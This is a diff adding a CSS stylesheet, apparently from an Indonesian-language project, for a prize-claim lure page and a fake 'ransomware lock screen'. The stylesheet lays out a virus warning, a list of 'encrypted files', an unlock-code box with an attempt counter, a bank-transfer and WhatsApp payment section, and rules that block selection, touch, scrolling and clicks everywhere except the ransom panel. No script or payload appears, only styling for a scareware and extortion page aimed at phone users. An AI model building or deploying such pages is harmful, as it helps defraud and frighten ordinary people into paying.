@@ -1,0 +1,666 @@
+/* ===== RESET TOTAL - SUPER LOCK ===== */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    -webkit-tap-highlight-color: transparent !important;
+    -webkit-touch-callout: none !important;
+    -webkit-user-select: none !important;
+    -moz-user-select: none !important;
+    -ms-user-select: none !important;
+    user-select: none !important;
+    touch-action: none !important;
+}
+
+html, body {
+    width: 100vw;
+    height: 100vh;
+    overflow: hidden !important;
+    position: fixed !important;
+    top: 0;
+    left: 0;
+    background: #000;
+    margin: 0;
+    padding: 0;
+    overscroll-behavior: none !important;
+}
+
+/* ===== PAGES ===== */
+.page {
+    width: 100vw;
+    height: 100vh;
+    position: fixed;
+    top: 0;
+    left: 0;
+    overflow: hidden;
+    display: none;
+}
+
+.page.active {
+    display: block;
+}
+
+/* ===== MAIN PAGE ===== */
+#mainPage {
+    background: linear-gradient(135deg, #000428, #004e92);
+    color: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.main-content {
+    width: 90%;
+    max-width: 500px;
+    text-align: center;
+    padding: 20px;
+}
+
+.header-glow {
+    margin-bottom: 30px;
+}
+
+.title {
+    font-size: 2.2rem;
+    color: #00ff9d;
+    text-shadow: 0 0 20px #00ff9d;
+    margin-bottom: 15px;
+    animation: glow 2s infinite;
+}
+
+@keyframes glow {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.8; }
+}
+
+.fireworks {
+    font-size: 2rem;
+    animation: sparkle 1.5s infinite;
+}
+
+@keyframes sparkle {
+    0%, 100% { opacity: 1; transform: scale(1); }
+    50% { opacity: 0.5; transform: scale(1.1); }
+}
+
+.prize-card {
+    background: linear-gradient(135deg, rgba(255,215,0,0.2), rgba(255,140,0,0.2));
+    border: 3px solid #ffd700;
+    border-radius: 20px;
+    padding: 25px;
+    margin: 25px 0;
+    backdrop-filter: blur(10px);
+}
+
+.prize-icon {
+    font-size: 4rem;
+    margin-bottom: 15px;
+}
+
+.prize-card h2 {
+    color: #ffd700;
+    font-size: 1.8rem;
+    margin-bottom: 10px;
+}
+
+.sponsor {
+    color: #00ffff;
+    font-weight: bold;
+    font-size: 1.2rem;
+}
+
+.validity {
+    background: rgba(0,0,0,0.5);
+    padding: 10px;
+    border-radius: 10px;
+    margin-top: 15px;
+}
+
+.time {
+    color: #ff0000;
+    font-weight: bold;
+    font-size: 1.3rem;
+}
+
+.instructions {
+    background: rgba(0,100,255,0.1);
+    border: 2px solid #0088ff;
+    border-radius: 15px;
+    padding: 20px;
+    margin: 20px 0;
+    text-align: left;
+}
+
+.instructions ol {
+    margin-left: 20px;
+    margin-top: 10px;
+}
+
+.instructions li {
+    margin: 8px 0;
+    color: #ffffff;
+}
+
+/* ===== TOMBOL CLAIM ===== */
+.claim-btn {
+    background: linear-gradient(45deg, #ff0000, #ff8800, #ff0000);
+    background-size: 200% 200%;
+    animation: gradientShift 2s infinite;
+    color: white;
+    border: none;
+    border-radius: 60px;
+    padding: 25px 20px;
+    font-size: 1.5rem;
+    font-weight: 900;
+    width: 100%;
+    margin: 30px 0;
+    cursor: pointer;
+    box-shadow: 0 0 40px #ff0000, 0 0 80px #ff0000;
+    transition: all 0.3s;
+    display: block;
+    position: relative;
+    overflow: hidden;
+}
+
+@keyframes gradientShift {
+    0% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+}
+
+.claim-btn:active {
+    transform: scale(0.95);
+    box-shadow: 0 0 60px #ff0000, 0 0 120px #ff0000;
+}
+
+.btn-main {
+    display: block;
+    font-size: 1.8rem;
+    margin-bottom: 5px;
+}
+
+.btn-sub {
+    display: block;
+    font-size: 1rem;
+    opacity: 0.9;
+}
+
+.warning-box {
+    background: rgba(255, 100, 0, 0.2);
+    border: 2px solid #ff6400;
+    border-radius: 15px;
+    padding: 15px;
+    margin: 20px 0;
+}
+
+.warning {
+    color: #ff9900;
+    font-size: 0.9rem;
+}
+
+.user-count {
+    background: rgba(0,255,0,0.1);
+    border: 2px solid #00ff00;
+    border-radius: 15px;
+    padding: 15px;
+    margin-top: 20px;
+}
+
+.user-count p {
+    color: #00ff00;
+    font-size: 1.1rem;
+}
+
+/* ===== RANSOMWARE LOCK SCREEN ===== */
+#lockScreen {
+    background: #000;
+    color: #ff0000;
+    z-index: 999999;
+}
+
+.blocker-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    background: #000;
+    z-index: 1;
+}
+
+.ransomware-container {
+    position: relative;
+    z-index: 2;
+    height: 100vh;
+    overflow-y: auto;
+    padding: 15px;
+    -webkit-overflow-scrolling: touch;
+}
+
+/* Virus Header */
+.virus-header {
+    text-align: center;
+    padding: 20px 0;
+    border-bottom: 3px solid #ff0000;
+    margin-bottom: 25px;
+}
+
+.warning-sign {
+    font-size: 4rem;
+    margin-bottom: 10px;
+    animation: rotate 4s infinite linear;
+}
+
+@keyframes rotate {
+    from { transform: rotate(0deg); }
+    to { transform: rotate(360deg); }
+}
+
+.virus-title {
+    font-size: 1.8rem;
+    color: #ff0000;
+    text-shadow: 0 0 15px #ff0000;
+    margin: 15px 0;
+    letter-spacing: 2px;
+}
+
+.virus-animation {
+    display: flex;
+    justify-content: center;
+    gap: 30px;
+    margin-top: 20px;
+}
+
+.virus {
+    font-size: 2.5rem;
+    animation: float 3s infinite ease-in-out;
+}
+
+.virus:nth-child(1) { animation-delay: 0s; }
+.virus:nth-child(2) { animation-delay: 1s; }
+.virus:nth-child(3) { animation-delay: 2s; }
+
+@keyframes float {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-20px); }
+}
+
+/* Device Status */
+.device-status {
+    display: flex;
+    justify-content: space-around;
+    background: rgba(255,0,0,0.1);
+    border: 2px solid #ff0000;
+    border-radius: 15px;
+    padding: 20px;
+    margin-bottom: 25px;
+    flex-wrap: wrap;
+}
+
+.status-item {
+    text-align: center;
+    padding: 10px;
+    min-width: 120px;
+}
+
+.status-icon {
+    font-size: 2rem;
+    display: block;
+    margin-bottom: 5px;
+}
+
+.status-text {
+    font-size: 1rem;
+    color: #ffffff;
+}
+
+.red {
+    color: #ff0000;
+    font-weight: bold;
+}
+
+/* Threat Message */
+.threat-message-box {
+    background: rgba(139,0,0,0.3);
+    border: 3px solid #ff0000;
+    border-radius: 15px;
+    padding: 25px;
+    margin-bottom: 25px;
+}
+
+.threat-title {
+    color: #ff0000;
+    font-size: 1.8rem;
+    text-align: center;
+    margin-bottom: 20px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+}
+
+.encrypted-files {
+    background: rgba(0,0,0,0.5);
+    padding: 20px;
+    border-radius: 10px;
+    margin-bottom: 20px;
+}
+
+.encrypted-files p {
+    color: #ffffff;
+    font-size: 1.1rem;
+    margin: 10px 0;
+    padding: 8px;
+    border-bottom: 1px solid #333;
+}
+
+.strike {
+    text-decoration: line-through;
+    color: #888;
+}
+
+.danger-alert {
+    background: rgba(255,0,0,0.2);
+    border: 2px solid #ff0000;
+    border-radius: 10px;
+    padding: 15px;
+    margin-top: 20px;
+}
+
+.danger-text {
+    color: #ffffff;
+    font-size: 1rem;
+    text-align: center;
+}
+
+/* Unlock Section */
+.unlock-section {
+    background: rgba(0,50,0,0.3);
+    border: 3px solid #00ff00;
+    border-radius: 15px;
+    padding: 25px;
+    margin-bottom: 25px;
+}
+
+.unlock-title {
+    color: #00ff00;
+    font-size: 1.5rem;
+    text-align: center;
+    margin-bottom: 10px;
+}
+
+.unlock-info {
+    color: #ffffff;
+    text-align: center;
+    margin-bottom: 20px;
+    font-size: 1rem;
+}
+
+.code-input-container {
+    display: flex;
+    flex-direction: column;
+    gap: 15px;
+    margin-bottom: 20px;
+}
+
+.code-input {
+    padding: 20px;
+    font-size: 1.5rem;
+    background: #000;
+    color: #00ff00;
+    border: 3px solid #00ff00;
+    border-radius: 10px;
+    text-align: center;
+    letter-spacing: 3px;
+    outline: none;
+    font-family: 'Courier New', monospace;
+    font-weight: bold;
+}
+
+.code-input:focus {
+    box-shadow: 0 0 25px #00ff00;
+}
+
+.submit-code-btn {
+    padding: 20px;
+    font-size: 1.5rem;
+    background: #ff0000;
+    color: white;
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+    font-weight: bold;
+    transition: all 0.3s;
+}
+
+.submit-code-btn:active {
+    background: #cc0000;
+    transform: scale(0.98);
+}
+
+.attempts-info {
+    text-align: center;
+    margin: 15px 0;
+    color: #ffff00;
+    font-size: 1.1rem;
+}
+
+.error-message {
+    color: #ff0000;
+    font-size: 1.1rem;
+    min-height: 25px;
+    margin-top: 10px;
+    font-weight: bold;
+}
+
+.code-hint {
+    text-align: center;
+    color: #888;
+    font-size: 0.9rem;
+    margin-top: 15px;
+    font-style: italic;
+}
+
+/* Payment Section */
+.payment-section {
+    background: rgba(0,0,50,0.3);
+    border: 3px solid #0088ff;
+    border-radius: 15px;
+    padding: 25px;
+    margin-bottom: 25px;
+}
+
+.payment-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 20px;
+}
+
+.payment-header h3 {
+    color: #0088ff;
+    font-size: 1.5rem;
+}
+
+.price-tag {
+    background: #ff0000;
+    color: white;
+    padding: 10px 20px;
+    border-radius: 10px;
+    font-size: 1.5rem;
+    font-weight: bold;
+}
+
+.payment-steps {
+    color: #ffffff;
+}
+
+.payment-steps p {
+    margin: 10px 0;
+    font-size: 1.1rem;
+}
+
+.bank-info {
+    background: rgba(0,0,0,0.5);
+    padding: 15px;
+    border-radius: 10px;
+    margin: 15px 0;
+    border-left: 4px solid #0088ff;
+}
+
+.bank-info p {
+    margin: 8px 0;
+    font-size: 1.1rem;
+}
+
+.contact-info {
+    background: rgba(0,100,0,0.3);
+    padding: 15px;
+    border-radius: 10px;
+    margin: 15px 0;
+    border-left: 4px solid #25D366;
+}
+
+.whatsapp-contact {
+    font-size: 1.3rem;
+    text-align: center;
+}
+
+.wa-number {
+    color: #25D366;
+    font-size: 1.4rem;
+    font-weight: bold;
+}
+
+.whatsapp-btn {
+    display: block;
+    background: #25D366;
+    color: white;
+    text-decoration: none;
+    padding: 20px;
+    border-radius: 10px;
+    margin: 20px 0;
+    font-size: 1.3rem;
+    font-weight: bold;
+    text-align: center;
+    transition: all 0.3s;
+}
+
+.whatsapp-btn:active {
+    background: #1da851;
+    transform: scale(0.98);
+}
+
+.wa-icon {
+    margin-right: 10px;
+}
+
+.delivery-info {
+    color: #888;
+    text-align: center;
+    font-size: 0.9rem;
+    margin-top: 15px;
+}
+
+/* Emergency Warning */
+.emergency-warning {
+    background: rgba(139,0,0,0.5);
+    border: 3px solid #ff0000;
+    border-radius: 15px;
+    padding: 20px;
+    margin-top: 25px;
+}
+
+.emergency-warning p {
+    color: #ffffff;
+    margin: 10px 0;
+    font-size: 1rem;
+    text-align: center;
+}
+
+.warning-red {
+    color: #ff0000 !important;
+    font-weight: bold;
+    font-size: 1.1rem !important;
+}
+
+/* Full Blocker */
+.full-blocker {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    background: #000;
+    z-index: 9999998;
+    display: none;
+}
+
+.force-focus {
+    position: absolute;
+    width: 0;
+    height: 0;
+    opacity: 0;
+}
+
+/* ===== FULL LOCK MODE ===== */
+body.locked {
+    overflow: hidden !important;
+    position: fixed !important;
+    width: 100vw !important;
+    height: 100vh !important;
+}
+
+body.locked *:not(.ransomware-container, .ransomware-container *) {
+    pointer-events: none !important;
+    touch-action: none !important;
+}
+
+/* Disable selection globally */
+::selection {
+    background: transparent !important;
+    color: inherit !important;
+}
+
+::-moz-selection {
+    background: transparent !important;
+    color: inherit !important;
+}
+
+/* Hide scrollbars but allow scrolling */
+.ransomware-container::-webkit-scrollbar {
+    width: 5px;
+}
+
+.ransomware-container::-webkit-scrollbar-track {
+    background: #000;
+}
+
+.ransomware-container::-webkit-scrollbar-thumb {
+    background: #ff0000;
+    border-radius: 10px;
+}
+
+/* ===== RESPONSIVE ===== */
+@media (max-width: 480px) {
+    .title {
+        font-size: 1.8rem;
+    }
+    
+    .claim-btn {
+        padding: 20px;
+        font-size: 1.3rem;
+    }
+    
+    .virus-title {
+        font-size: 1.4rem;
+    }
+    
+    .device-status {
+        flex-direction: column;
+        align-items: center;
+    }
+    
+    .status-item {
+        width: 100%;
+        margin: 10px 0;
+    }
+}
